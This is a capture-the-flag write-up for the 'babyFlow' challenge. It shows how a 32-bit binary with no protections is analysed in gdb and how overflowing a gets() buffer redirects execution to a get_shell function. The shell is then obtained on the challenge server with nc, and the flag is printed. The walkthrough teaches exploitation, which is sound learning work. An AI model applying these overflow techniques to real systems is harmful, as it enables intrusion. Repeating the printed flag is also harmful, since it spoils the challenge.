# babyFlow

## Overview

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/Incognito-4.0/images/Pasted%20image%2020230218143755.png)

## Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Incognito-4.0/pwn/babyFlow/babyFlow):**
```shell
┌[siunam♥earth]-(~/ctf/Incognito-4.0/pwn/babyFlow)-[2023.02.18|14:37:24(HKT)]
└> file babyFlow 
babyFlow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=e5fdcc6030ccf9d36747c71494f2c13507cf5a5a, for GNU/Linux 4.4.0, not stripped
┌[siunam♥earth]-(~/ctf/Incognito-4.0/pwn/babyFlow)-[2023.02.18|14:38:15(HKT)]
└> chmod +x babyFlow
```

It's an ELF **32-bit** executable!

**checksec:**
```shell
┌[siunam♥earth]-(~/ctf/Incognito-4.0/pwn/babyFlow)-[2023.02.18|14:38:42(HKT)]
└> checksec babyFlow
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/siunam/ctf/Incognito-4.0/pwn/babyFlow/babyFlow'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

As you can see, it has **no memory protection** at all.

**Let's try to run it:**
```shell
┌[siunam♥earth]-(~/ctf/Incognito-4.0/pwn/babyFlow)-[2023.02.18|14:42:40(HKT)]
└> ./babyFlow 
can you pass me?
hello
```

In here, the executable will ask us for input.

**Then, we can use `gdb` to disassemble the binary:** (I'm using `gef` plugin)
```shell
┌[siunam♥earth]-(~/ctf/Incognito-4.0/pwn/babyFlow)-[2023.02.18|14:38:44(HKT)]
└> gdb babyFlow
[...]
gef➤  
```

**First, we want to know what the `main()` function is doing:**
```shell
gef➤  disassemble main
Dump of assembler code for function main:
   0x08049256 <+0>:	lea    ecx,[esp+0x4]
   0x0804925a <+4>:	and    esp,0xfffffff0
   0x0804925d <+7>:	push   DWORD PTR [ecx-0x4]
   0x08049260 <+10>:	push   ebp
   0x08049261 <+11>:	mov    ebp,esp
   0x08049263 <+13>:	push   ebx
   0x08049264 <+14>:	push   ecx
   0x08049265 <+15>:	sub    esp,0x50
   0x08049268 <+18>:	call   0x80490f0 <__x86.get_pc_thunk.bx>
   0x0804926d <+23>:	add    ebx,0x2d87
   0x08049273 <+29>:	sub    esp,0xc
   0x08049276 <+32>:	lea    eax,[ebx-0x1fe4]
   0x0804927c <+38>:	push   eax
   0x0804927d <+39>:	call   0x8049070 <puts@plt>
   0x08049282 <+44>:	add    esp,0x10
   0x08049285 <+47>:	sub    esp,0xc
   0x08049288 <+50>:	lea    eax,[ebp-0x58]
   0x0804928b <+53>:	push   eax
   0x0804928c <+54>:	call   0x8049050 <gets@plt>
   0x08049291 <+59>:	add    esp,0x10
   0x08049294 <+62>:	sub    esp,0xc
   0x08049297 <+65>:	lea    eax,[ebp-0x58]
   0x0804929a <+68>:	push   eax
   0x0804929b <+69>:	call   0x804922b <vulnerable_function>
   0x080492a0 <+74>:	add    esp,0x10
   0x080492a3 <+77>:	mov    eax,0x0
   0x080492a8 <+82>:	lea    esp,[ebp-0x8]
   0x080492ab <+85>:	pop    ecx
   0x080492ac <+86>:	pop    ebx
   0x080492ad <+87>:	pop    ebp
   0x080492ae <+88>:	lea    esp,[ecx-0x4]
   0x080492b1 <+91>:	ret
```

In `0x0804927d <+39>`, it calls a function called `puts()`, which should prints out "can you pass me?".

Then, **in `0x0804928c <+54>`, it calls a function called `gets()`**, which is getting user's input.

However, ***the `gets()` function is very, very dangerous, and vulnerable to buffer overflow***.

> **gets**() reads a line from _stdin_ into the buffer pointed to by _s_ until either a terminating newline or **EOF**, which it replaces with a null byte ('`\0`'). **No check for buffer overrun is performed.**

**In the [Linux man page](https://man7.org/linux/man-pages/man3/gets.3.html), it said:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Incognito-4.0/images/Pasted%20image%2020230218144742.png)

That being said, the `gets()` function is the source (Attacker's controllable input).

After calling `gets()` function, it'll also called `vulnerable_function()`. As the name suggested, it's should be vulnerable!

**disassemble `vulnerable_function()`:**
```shell
gef➤  disassemble vulnerable_function 
Dump of assembler code for function vulnerable_function:
   0x0804922b <+0>:	push   ebp
   0x0804922c <+1>:	mov    ebp,esp
   0x0804922e <+3>:	push   ebx
   0x0804922f <+4>:	sub    esp,0x14
   0x08049232 <+7>:	call   0x80492b2 <__x86.get_pc_thunk.ax>
   0x08049237 <+12>:	add    eax,0x2dbd
   0x0804923c <+17>:	sub    esp,0x8
   0x0804923f <+20>:	push   DWORD PTR [ebp+0x8]
   0x08049242 <+23>:	lea    edx,[ebp-0x14]
   0x08049245 <+26>:	push   edx
   0x08049246 <+27>:	mov    ebx,eax
   0x08049248 <+29>:	call   0x8049060 <strcpy@plt>
   0x0804924d <+34>:	add    esp,0x10
   0x08049250 <+37>:	nop
   0x08049251 <+38>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08049254 <+41>:	leave  
   0x08049255 <+42>:	ret
```

This function is copying `strcpy()` a string.

**We can also see there is a function called `get_shell()`:**
```shell
gef➤  disassemble get_shell 
Dump of assembler code for function get_shell:
   0x080491fc <+0>:	push   ebp
   0x080491fd <+1>:	mov    ebp,esp
   0x080491ff <+3>:	push   ebx
   0x08049200 <+4>:	sub    esp,0x4
   0x08049203 <+7>:	call   0x80492b2 <__x86.get_pc_thunk.ax>
   0x08049208 <+12>:	add    eax,0x2dec
   0x0804920d <+17>:	sub    esp,0x4
   0x08049210 <+20>:	push   0x0
   0x08049212 <+22>:	push   0x0
   0x08049214 <+24>:	lea    edx,[eax-0x1fec]
   0x0804921a <+30>:	push   edx
   0x0804921b <+31>:	mov    ebx,eax
   0x0804921d <+33>:	call   0x8049080 <execve@plt>
   0x08049222 <+38>:	add    esp,0x10
   0x08049225 <+41>:	nop
   0x08049226 <+42>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08049229 <+45>:	leave  
   0x0804922a <+46>:	ret
```

**This function will execute `/bin/sh`.**

## Exploitation

Armed with above information, **we can try to overflow the EIP register, so that we can execute `/bin/sh`!**

**In `gdb`, we can set a breakpoint. Let's set it in `*main+54`, which is the `gets()` function is being called:**
```shell
gef➤  break *main+54
Breakpoint 1 at 0x804928c
```

**Then, we can run the executable:**
```shell
┌[siunam♥earth]-(~/ctf/Incognito-4.0/pwn/babyFlow)-[2023.02.18|15:09:26(HKT)]
└> python3 -c "print('A'*20)"
AAAAAAAAAAAAAAAAAAAA
```

```shell
gef➤  r
[...]
can you pass me?
[...]
gef➤  n
Single stepping until exit from function main,
which has no line number information.
AAAAAAAAAAAAAAAAAAAA

Program received signal SIGILL, Illegal instruction.
0xffffcf3e in ?? ()
[...]
──────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0x804926d  →  <main+23> add ebx, 0x2d87
$ecx   : 0xf7ffda40  →  0x00000000
$edx   : 0xffffcdf4  →  "AAAA"
$esp   : 0xf7ffda40  →  0x00000000
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x804bef4  →  0x8049180  →   endbr32 
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0xffffcf3e  →  0xd186ffff
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
[...]
```

As you can see, the EIP register is not overflowed with `41`'s (A).

**Let's try to add more 4 bytes:**
```shell
┌[siunam♥earth]-(~/ctf/Incognito-4.0/pwn/babyFlow)-[2023.02.18|15:09:29(HKT)]
└> python3 -c "print('A'*20 + 'B' * 4)"
AAAAAAAAAAAAAAAAAAAABBBB
```

```shell
gef➤  r
[...]
can you pass me?
[...]
gef➤  n
Single stepping until exit from function main,
which has no line number information.
AAAAAAAAAAAAAAAAAAAABBBB
process 67149 is executing new program: /usr/bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Error in re-setting breakpoint 1: No symbol "main" in current context.
$ id
[Detaching after vfork from child process 67345]
uid=1000(siunam) gid=1000(nam) groups=1000(nam),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer)
$ 
```

Wait, what? We spawned a shell?

That being said, we successfully overflowed the EIP register to 4 B's (`42`).

**Now, we can `nc` to the challenge instance, and get the flag!**
```shell
┌[siunam♥earth]-(~/ctf/Incognito-4.0/pwn/babyFlow)-[2023.02.18|15:13:18(HKT)]
└> nc -nv  143.198.219.171 5000
(UNKNOWN) [143.198.219.171] 5000 (?) open
can you pass me?
AAAAAAAAAAAAAAAAAAAABBBB
whoami;hostname;id
ctf
1801b85e77d9
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
cat /home/ctf/flag
ictf{bf930bcd-6c10-4c05-bdd8-435db4b50cdb}
```

- **Flag: `ictf{bf930bcd-6c10-4c05-bdd8-435db4b50cdb}`**

# Conclusion

What we've learned:

1. Basic Stack Buffer Overflow Via `gets()` Function